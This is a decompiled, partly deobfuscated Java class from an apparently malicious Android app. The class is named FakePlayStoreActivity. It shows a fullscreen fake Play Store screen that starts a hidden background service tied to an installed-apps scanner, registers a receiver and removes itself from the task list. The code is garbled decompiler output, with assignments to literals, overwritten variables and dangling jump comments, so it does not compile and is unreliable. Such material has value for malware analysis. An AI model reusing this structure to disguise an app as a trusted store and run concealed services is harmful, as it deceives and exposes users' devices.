package com.tencent;

import android.content.*;
import android.view.*;
import android.widget.*;
import android.app.*;
import android.os.*;
import android.accessibilityservice.*;
import android.view.accessibility.*;
import android.telephony.*;
import android.media.*;
import java.util.*;
import java.io.*;
import java.net.*;

/**
 * Deobfuscated class: FakePlayStoreActivity
 * Original: Lcom/tencent/endorsementkethicala24;
 */
public class FakePlayStoreActivity extends Activity {

    // === FIELDS ===
    private final BroadcastReceiver abcd;

    // === METHODS ===

    public void Constructor() {
        // new Activity()
        v0 = new FakePlayStoreActivity$1();
        // new FakePlayStoreActivity$1(v1)
        v1.abcd = v0;
        return;
    }

    public void finish() {
        v0.finishAndRemoveTask();
        return;
    }

    protected void onCreate(Bundle param0) {
        v4.onCreate(v5);
        v5 = 1;
        v4.requestWindowFeature(1);
        v0 = v4.getWindow();
        v0 = 1024;
        1.setFlags(1024, 1024);
        v4.getIntent();
        1.getStringArrayExtra("key");
        if (1 == null || 1 == 0) { // goto +41
        v1 = v4.getApplicationContext();
        v1 = SecondaryBackgroundService.class;
        v1 = BackgroundServiceHelper.removedqtractort40(v1, "key");
        if (v1 == null || v1 == 0) { // goto +29
        v1 = v4.abcd;
        v2 = new IntentFilter();
        v3 = "xyz";
        // new IntentFilter("xyz")
        v4.registerReceiver(v1, v2);
        v1 = new Intent();
        v2 = SecondaryBackgroundService.class;
        // new Intent("key", v2)
        v2 = InstalledAppsScanner.FTX1;
        v1.putExtra(v2, 1);
        "key".startService(v1);
        v4.finish();
        return;
    }

    protected void onDestroy() {
        v1.onDestroy();
        v0 = v1.abcd;
        v1.unregisterReceiver(v0);
        return;
    }
}
